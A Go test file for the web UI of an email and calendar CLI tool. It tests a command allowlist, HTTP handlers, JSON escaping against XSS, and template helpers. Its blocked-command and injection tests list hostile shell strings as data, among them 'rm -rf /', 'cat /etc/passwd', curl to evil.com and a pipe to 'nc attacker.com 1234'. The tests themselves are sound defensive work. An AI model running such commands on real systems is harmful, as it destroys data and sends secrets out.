package ui

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// =============================================================================
// Command Validation Tests
// =============================================================================

func TestAllowedCommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		allowed bool
	}{
		// Auth commands
		{"auth login", "auth login", true},
		{"auth logout", "auth logout", true},
		{"auth status", "auth status", true},
		{"auth whoami", "auth whoami", true},
		{"auth list", "auth list", true},
		{"auth show", "auth show", true},
		{"auth switch", "auth switch", true},
		{"auth config", "auth config", true},
		{"auth providers", "auth providers", true},

		// Email commands
		{"email list", "email list", true},
		{"email read", "email read", true},
		{"email send", "email send", true},
		{"email search", "email search", true},
		{"email delete", "email delete", true},
		{"email folders list", "email folders list", true},
		{"email threads list", "email threads list", true},
		{"email drafts create", "email drafts create", true},

		// Calendar commands
		{"calendar list", "calendar list", true},
		{"calendar events list", "calendar events list", true},
		{"calendar events show", "calendar events show", true},
		{"calendar availability check", "calendar availability check", true},

		// Version
		{"version", "version", true},

		// Blocked commands
		{"rm command", "rm -rf /", false},
		{"shell injection", "email list; rm -rf /", false},
		{"unknown command", "unknown command", false},
		{"empty command", "", false},
		{"sudo", "sudo anything", false},
		{"curl", "curl http://evil.com", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isCommandAllowed(tt.command)
			if result != tt.allowed {
				t.Errorf("isCommandAllowed(%q) = %v, want %v", tt.command, result, tt.allowed)
			}
		})
	}
}

// isCommandAllowed checks if a command is in the allowlist.
// This is extracted for testing purposes.
func isCommandAllowed(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}

	// Check for shell metacharacters (defense in depth)
	if containsDangerousChars(cmd) {
		return false
	}

	args := strings.Fields(cmd)
	if len(args) == 0 {
		return false
	}

	// Try 3-word command first
	if len(args) >= 3 {
		baseCmd := args[0] + " " + args[1] + " " + args[2]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	// Try 2-word command
	if len(args) >= 2 {
		baseCmd := args[0] + " " + args[1]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	// Try 1-word command
	if len(args) >= 1 {
		baseCmd := args[0]
		if allowedCommands[baseCmd] {
			return true
		}
	}

	return false
}

// =============================================================================
// HTTP Handler Tests
// =============================================================================

func TestHandleExecCommand_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test GET method (should fail)
	req := httptest.NewRequest(http.MethodGet, "/api/exec", nil)
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleExecCommand_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/exec", strings.NewReader("invalid json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message in response")
	}
}

func TestHandleExecCommand_BlockedCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	blockedCommands := []string{
		"rm -rf /",
		"sudo anything",
		"curl http://evil.com",
		"wget http://evil.com",
		"cat /etc/passwd",
		"unknown command",
		"; rm -rf /",
		"email list | curl http://evil.com",
	}

	for _, cmd := range blockedCommands {
		t.Run(cmd, func(t *testing.T) {
			body, _ := json.Marshal(ExecRequest{Command: cmd})
			req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			server.handleExecCommand(w, req)

			if w.Code != http.StatusForbidden {
				t.Errorf("Command %q: expected status %d, got %d", cmd, http.StatusForbidden, w.Code)
			}

			var resp ExecResponse
			if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
				t.Fatalf("Failed to decode response: %v", err)
			}

			if !strings.Contains(resp.Error, "not allowed") {
				t.Errorf("Expected 'not allowed' error, got: %s", resp.Error)
			}
		})
	}
}

func TestHandleConfigStatus_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/status", nil)
	w := httptest.NewRecorder()

	server.handleConfigStatus(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleListGrants_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants", nil)
	w := httptest.NewRecorder()

	server.handleListGrants(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/grants/default", nil)
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleSetDefaultGrant_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleSetDefaultGrant_EmptyGrantID(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetDefaultGrantRequest{GrantID: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/grants/default", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleSetDefaultGrant(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetDefaultGrantResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "required") {
		t.Errorf("Expected 'required' error, got: %s", resp.Error)
	}
}

func TestHandleConfigSetup_MethodNotAllowed(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/api/config/setup", nil)
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected status %d, got %d", http.StatusMethodNotAllowed, w.Code)
	}
}

func TestHandleConfigSetup_InvalidJSON(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", strings.NewReader("invalid"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}
}

func TestHandleConfigSetup_EmptyAPIKey(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(SetupRequest{APIKey: "", Region: "us"})
	req := httptest.NewRequest(http.MethodPost, "/api/config/setup", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleConfigSetup(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status %d, got %d", http.StatusBadRequest, w.Code)
	}

	var resp SetupResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if !strings.Contains(resp.Error, "API key") {
		t.Errorf("Expected API key error, got: %s", resp.Error)
	}
}

func TestHandleIndex_NotFoundForNonRoot(t *testing.T) {
	t.Parallel()

	server := &Server{}

	req := httptest.NewRequest(http.MethodGet, "/nonexistent", nil)
	w := httptest.NewRecorder()

	server.handleIndex(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status %d, got %d", http.StatusNotFound, w.Code)
	}
}

// =============================================================================
// WriteJSON Helper Tests
// =============================================================================

func TestWriteJSON(t *testing.T) {
	t.Parallel()

	w := httptest.NewRecorder()

	data := map[string]string{"key": "value"}
	writeJSON(w, http.StatusOK, data)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status %d, got %d", http.StatusOK, w.Code)
	}

	contentType := w.Header().Get("Content-Type")
	if contentType != "application/json" {
		t.Errorf("Expected Content-Type application/json, got %s", contentType)
	}

	var result map[string]string
	if err := json.NewDecoder(w.Body).Decode(&result); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if result["key"] != "value" {
		t.Errorf("Expected key=value, got key=%s", result["key"])
	}
}

// =============================================================================
// Command Whitelist Completeness Tests
// =============================================================================

func TestAllowedCommandsCompleteness(t *testing.T) {
	t.Parallel()

	// Verify all expected command categories are present
	expectedPrefixes := []string{
		"auth",
		"email",
		"calendar",
		"version",
	}

	for _, prefix := range expectedPrefixes {
		found := false
		for cmd := range allowedCommands {
			if strings.HasPrefix(cmd, prefix) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("No commands found with prefix %q", prefix)
		}
	}
}

func TestAllowedCommands_NoShellCharacters(t *testing.T) {
	t.Parallel()

	// Verify no allowed commands contain shell metacharacters
	dangerousChars := []string{";", "|", "&", "`", "$", "(", ")", "<", ">", "\\"}

	for cmd := range allowedCommands {
		for _, char := range dangerousChars {
			if strings.Contains(cmd, char) {
				t.Errorf("Allowed command %q contains dangerous character %q", cmd, char)
			}
		}
	}
}

// =============================================================================
// Request/Response Type Tests
// =============================================================================

func TestExecRequestJSON(t *testing.T) {
	t.Parallel()

	req := ExecRequest{Command: "email list"}
	data, err := json.Marshal(req)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecRequest
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Command != req.Command {
		t.Errorf("Expected command %q, got %q", req.Command, decoded.Command)
	}
}

func TestExecResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ExecResponse{Output: "test output", Error: ""}
	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ExecResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Output != resp.Output {
		t.Errorf("Expected output %q, got %q", resp.Output, decoded.Output)
	}
}

func TestConfigStatusResponseJSON(t *testing.T) {
	t.Parallel()

	resp := ConfigStatusResponse{
		Configured:   true,
		Region:       "us",
		ClientID:     "test-client",
		HasAPIKey:    true,
		GrantCount:   2,
		DefaultGrant: "grant-123",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ConfigStatusResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Configured != resp.Configured {
		t.Errorf("Expected Configured %v, got %v", resp.Configured, decoded.Configured)
	}
	if decoded.GrantCount != resp.GrantCount {
		t.Errorf("Expected GrantCount %d, got %d", resp.GrantCount, decoded.GrantCount)
	}
}

// =============================================================================
// Security Tests
// =============================================================================

func TestCommandInjectionPrevention(t *testing.T) {
	t.Parallel()

	injectionAttempts := []string{
		"email list; rm -rf /",
		"email list && cat /etc/passwd",
		"email list | nc attacker.com 1234",
		"email list `whoami`",
		"email list $(whoami)",
		"email list\nrm -rf /",
		"email list\x00rm -rf /",
		"../../../etc/passwd",
		"email list --flag=$(cat /etc/passwd)",
	}

	for _, attempt := range injectionAttempts {
		t.Run(attempt[:min(20, len(attempt))], func(t *testing.T) {
			if isCommandAllowed(attempt) {
				t.Errorf("Injection attempt should be blocked: %q", attempt)
			}
		})
	}
}

func TestCommandWithFlagsAllowed(t *testing.T) {
	t.Parallel()

	// Commands with legitimate flags should be allowed
	legitimateCommands := []string{
		"email list --limit 10",
		"email list --unread --starred",
		"auth login --provider google",
		"calendar events list --days 7",
		"email folders list --id",
	}

	for _, cmd := range legitimateCommands {
		t.Run(cmd, func(t *testing.T) {
			if !isCommandAllowed(cmd) {
				t.Errorf("Legitimate command should be allowed: %q", cmd)
			}
		})
	}
}

// =============================================================================
// XSS Prevention Tests
// =============================================================================

func TestSafeJSJSON_EscapesDangerousSequences(t *testing.T) {
	t.Parallel()

	// Go's json.Marshal escapes <, >, & as unicode escape sequences
	// This prevents XSS when embedding JSON in HTML script tags
	tests := []struct {
		name     string
		input    any
		contains string // What the escaped output should contain
		excludes string // What should NOT appear unescaped
	}{
		{
			name:     "escapes script close tag",
			input:    map[string]string{"content": "</script>"},
			contains: `\u003c/script\u003e`, // < and > escaped
			excludes: "</script>",
		},
		{
			name:     "escapes HTML comment start",
			input:    map[string]string{"content": "<!--"},
			contains: `\u003c!--`, // < escaped
			excludes: "<!--",
		},
		{
			name:     "escapes greater than",
			input:    map[string]string{"content": "-->"},
			contains: `--\u003e`, // > escaped
			excludes: "-->",
		},
		{
			name:     "escapes ampersand",
			input:    map[string]string{"content": "&amp;"},
			contains: `\u0026amp;`, // & escaped
			excludes: "&amp;",
		},
		{
			name:     "normal content unchanged",
			input:    map[string]string{"key": "value"},
			contains: `"key":"value"`,
			excludes: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := string(safeJSJSON(tt.input))

			if tt.contains != "" && !strings.Contains(result, tt.contains) {
				t.Errorf("Expected result to contain %q, got: %s", tt.contains, result)
			}

			if tt.excludes != "" && strings.Contains(result, tt.excludes) {
				t.Errorf("Expected result to NOT contain %q, got: %s", tt.excludes, result)
			}
		})
	}
}

func TestSafeJSJSON_HandlesNil(t *testing.T) {
	t.Parallel()

	result := string(safeJSJSON(nil))
	if result != "null" {
		t.Errorf("Expected 'null', got: %s", result)
	}
}

func TestSafeJSJSON_HandlesPageData(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{
			{ID: "test-id", Email: "test@example.com", Provider: "google"},
		},
	}

	result := string(data.GrantsJSON())

	if !strings.Contains(result, "test@example.com") {
		t.Errorf("Expected result to contain email, got: %s", result)
	}

	// Ensure dangerous characters are escaped (< becomes \u003c)
	if strings.Contains(result, "<") || strings.Contains(result, ">") {
		t.Errorf("Result should not contain unescaped < or >: %s", result)
	}
}

func TestSafeJSJSON_HandlesError(t *testing.T) {
	t.Parallel()

	// Create an unmarshalable value (channel)
	ch := make(chan int)
	result := string(safeJSJSON(ch))

	if result != "null" {
		t.Errorf("Expected 'null' for unmarshalable value, got: %s", result)
	}
}

// =============================================================================
// Template Loading Tests
// =============================================================================

func TestLoadTemplates(t *testing.T) {
	t.Parallel()

	tmpl, err := loadTemplates()
	if err != nil {
		t.Fatalf("loadTemplates() failed: %v", err)
	}

	if tmpl == nil {
		t.Fatal("loadTemplates() returned nil template")
	}

	// Verify templates are loaded (ParseFS uses base filename as name)
	templates := tmpl.Templates()
	if len(templates) == 0 {
		t.Error("No templates loaded")
	}

	// Log loaded template names for debugging
	var names []string
	for _, tpl := range templates {
		if tpl.Name() != "" {
			names = append(names, tpl.Name())
		}
	}

	// Verify we have some templates
	if len(names) < 3 {
		t.Errorf("Expected at least 3 templates, got %d: %v", len(names), names)
	}
}

func TestLoadTemplates_FunctionsAvailable(t *testing.T) {
	t.Parallel()

	tmpl, err := loadTemplates()
	if err != nil {
		t.Fatalf("loadTemplates() failed: %v", err)
	}

	// Test that template functions work by executing a simple template
	testTmpl, err := tmpl.New("test").Parse(`{{ upper "hello" }}`)
	if err != nil {
		t.Fatalf("Failed to parse test template: %v", err)
	}

	var buf bytes.Buffer
	if err := testTmpl.Execute(&buf, nil); err != nil {
		t.Fatalf("Failed to execute template: %v", err)
	}

	if buf.String() != "HELLO" {
		t.Errorf("Expected 'HELLO', got %q", buf.String())
	}
}

// =============================================================================
// Template Function Tests
// =============================================================================

func TestTemplateFuncs_Upper(t *testing.T) {
	t.Parallel()

	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "HELLO"},
		{"HELLO", "HELLO"},
		{"Hello World", "HELLO WORLD"},
		{"", ""},
		{"123abc", "123ABC"},
	}

	upperFn := templateFuncs["upper"].(func(string) string)

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := upperFn(tt.input)
			if result != tt.expected {
				t.Errorf("upper(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestTemplateFuncs_Lower(t *testing.T) {
	t.Parallel()

	tests := []struct {
		input    string
		expected string
	}{
		{"HELLO", "hello"},
		{"hello", "hello"},
		{"Hello World", "hello world"},
		{"", ""},
		{"123ABC", "123abc"},
	}

	lowerFn := templateFuncs["lower"].(func(string) string)

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := lowerFn(tt.input)
			if result != tt.expected {
				t.Errorf("lower(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestTemplateFuncs_Slice(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		input    string
		start    int
		end      int
		expected string
	}{
		{"normal slice", "hello", 0, 3, "hel"},
		{"full string", "hello", 0, 5, "hello"},
		{"middle slice", "hello", 1, 4, "ell"},
		{"empty result", "hello", 2, 2, ""},
		{"start beyond length", "hello", 10, 15, ""},
		{"end beyond length", "hello", 0, 100, "hello"},
		{"empty string", "", 0, 0, ""},
		{"unicode string bytes", "héllo", 0, 3, "hé"}, // slice works on bytes, not runes (é = 2 bytes)
		{"single char", "a", 0, 1, "a"},
	}

	sliceFn := templateFuncs["slice"].(func(string, int, int) string)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sliceFn(tt.input, tt.start, tt.end)
			if result != tt.expected {
				t.Errorf("slice(%q, %d, %d) = %q, want %q",
					tt.input, tt.start, tt.end, result, tt.expected)
			}
		})
	}
}

// =============================================================================
// Response Body Validation Tests
// =============================================================================

func TestHandleExecCommand_ResponseStructure(t *testing.T) {
	t.Parallel()

	server := &Server{}

	// Test blocked command response structure
	body, _ := json.Marshal(ExecRequest{Command: "rm -rf /"})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	// Verify response has expected fields
	if resp.Error == "" {
		t.Error("Expected non-empty error field for blocked command")
	}
	if resp.Output != "" {
		t.Errorf("Expected empty output for blocked command, got: %s", resp.Output)
	}
}

func TestHandleExecCommand_EmptyCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(ExecRequest{Command: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected status %d for empty command, got %d", http.StatusForbidden, w.Code)
	}

	var resp ExecResponse
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	if resp.Error == "" {
		t.Error("Expected error message for empty command")
	}
}

func TestHandleExecCommand_WhitespaceOnlyCommand(t *testing.T) {
	t.Parallel()

	server := &Server{}

	body, _ := json.Marshal(ExecRequest{Command: "   \t\n  "})
	req := httptest.NewRequest(http.MethodPost, "/api/exec", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	server.handleExecCommand(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected status %d for whitespace command, got %d", http.StatusForbidden, w.Code)
	}
}

func TestConfigStatusResponse_JSONStructure(t *testing.T) {
	t.Parallel()

	// Test the response structure directly (handler requires configService)
	resp := ConfigStatusResponse{
		Configured:   true,
		ClientID:     "client-123",
		Region:       "us",
		HasAPIKey:    true,
		GrantCount:   2,
		DefaultGrant: "grant-abc",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded ConfigStatusResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if decoded.Configured != true {
		t.Error("Expected Configured to be true")
	}
	if decoded.GrantCount != 2 {
		t.Errorf("Expected GrantCount 2, got %d", decoded.GrantCount)
	}
	if decoded.Region != "us" {
		t.Errorf("Expected Region 'us', got %q", decoded.Region)
	}
}

func TestConfigStatusResponse_Unconfigured(t *testing.T) {
	t.Parallel()

	resp := ConfigStatusResponse{
		Configured: false,
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	// Verify JSON has expected structure
	if !strings.Contains(string(data), `"configured":false`) {
		t.Errorf("Expected configured:false, got: %s", string(data))
	}
}

func TestGrantsResponse_JSONStructure(t *testing.T) {
	t.Parallel()

	// Test the response structure directly (handler requires grantStore)
	resp := GrantsResponse{
		Grants:       []Grant{{ID: "test", Email: "test@example.com", Provider: "google"}},
		DefaultGrant: "test",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	var decoded GrantsResponse
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Failed to unmarshal: %v", err)
	}

	if len(decoded.Grants) != 1 {
		t.Errorf("Expected 1 grant, got %d", len(decoded.Grants))
	}
	if decoded.DefaultGrant != "test" {
		t.Errorf("Expected default_grant 'test', got %q", decoded.DefaultGrant)
	}
}

func TestGrantsResponse_EmptyGrants(t *testing.T) {
	t.Parallel()

	resp := GrantsResponse{
		Grants:       []Grant{},
		DefaultGrant: "",
	}

	data, err := json.Marshal(resp)
	if err != nil {
		t.Fatalf("Failed to marshal: %v", err)
	}

	// Verify it produces valid empty array JSON
	if !strings.Contains(string(data), `"grants":[]`) {
		t.Errorf("Expected empty grants array, got: %s", string(data))
	}
}

// =============================================================================
// GetDefaultCommands Tests
// =============================================================================

func TestGetDefaultCommands(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Verify all categories have commands
	if len(cmds.Auth) == 0 {
		t.Error("Auth commands should not be empty")
	}
	if len(cmds.Email) == 0 {
		t.Error("Email commands should not be empty")
	}
	if len(cmds.Calendar) == 0 {
		t.Error("Calendar commands should not be empty")
	}
}

func TestGetDefaultCommands_RequiredFields(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Check all commands have required fields
	allCommands := append(append(cmds.Auth, cmds.Email...), cmds.Calendar...)

	for _, cmd := range allCommands {
		if cmd.Key == "" {
			t.Errorf("Command has empty Key: %+v", cmd)
		}
		if cmd.Title == "" {
			t.Errorf("Command %q has empty Title", cmd.Key)
		}
		if cmd.Cmd == "" {
			t.Errorf("Command %q has empty Cmd", cmd.Key)
		}
		if cmd.Desc == "" {
			t.Errorf("Command %q has empty Desc", cmd.Key)
		}
	}
}

func TestGetDefaultCommands_ParamCommands(t *testing.T) {
	t.Parallel()

	cmds := GetDefaultCommands()

	// Find commands that require parameters
	allCommands := append(append(cmds.Auth, cmds.Email...), cmds.Calendar...)

	paramCommands := 0
	for _, cmd := range allCommands {
		if cmd.ParamName != "" {
			paramCommands++
			if cmd.Placeholder == "" {
				t.Errorf("Command %q has ParamName but no Placeholder", cmd.Key)
			}
		}
	}

	// Verify we have some commands that take parameters
	if paramCommands == 0 {
		t.Error("Expected some commands to have parameters (read, show, search)")
	}
}

// =============================================================================
// PageData JSON Methods Tests
// =============================================================================

func TestPageData_GrantsJSON_Empty(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{},
	}

	result := string(data.GrantsJSON())
	if result != "[]" {
		t.Errorf("Expected '[]' for empty grants, got: %s", result)
	}
}

func TestPageData_GrantsJSON_WithData(t *testing.T) {
	t.Parallel()

	data := PageData{
		Grants: []Grant{
			{ID: "id-1", Email: "user1@example.com", Provider: "google"},
			{ID: "id-2", Email: "user2@example.com", Provider: "microsoft"},
		},
	}

	result := string(data.GrantsJSON())

	// Verify it's valid JSON
	var grants []Grant
	if err := json.Unmarshal([]byte(result), &grants); err != nil {
		t.Fatalf("Failed to unmarshal GrantsJSON result: %v", err)
	}

	if len(grants) != 2 {
		t.Errorf("Expected 2 grants, got %d", len(grants))
	}
}

func TestPageData_CommandsJSON(t *testing.T) {
	t.Parallel()

	data := PageData{
		Commands: GetDefaultCommands(),
	}

	result := string(data.CommandsJSON())

	// Verify it's valid JSON
	var cmds Commands
	if err := json.Unmarshal([]byte(result), &cmds); err != nil {
		t.Fatalf("Failed to unmarshal CommandsJSON result: %v", err)
	}

	if len(cmds.Auth) == 0 {
		t.Error("Expected auth commands in JSON")
	}
}
